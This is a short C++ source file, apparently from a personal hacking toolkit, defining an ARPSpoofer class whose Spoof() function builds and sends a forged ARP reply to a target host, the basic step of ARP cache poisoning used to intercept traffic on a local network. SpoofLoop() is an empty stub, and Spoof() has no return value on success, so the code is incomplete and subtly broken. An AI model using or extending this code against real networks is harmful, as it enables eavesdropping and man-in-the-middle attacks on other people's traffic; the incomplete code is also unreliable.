#include "ARPSpoofer.h"
#include "/home/tuomok/Projects/CHaks/CHaks/PacketCraft/src/include/PCInclude.h"

ARPSpoof::ARPSpoofer::ARPSpoofer()
{

}

ARPSpoof::ARPSpoofer::~ARPSpoofer()
{

}

int ARPSpoof::ARPSpoofer::Spoof(int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, const char* targetIP)
{
    PacketCraft::ARPPacket arpPacket;

    if(arpPacket.Create(srcMAC, dstMAC, srcIP, targetIP, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }
}

int ARPSpoof::ARPSpoofer::SpoofLoop(int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, const char* targetIP)
{
    
}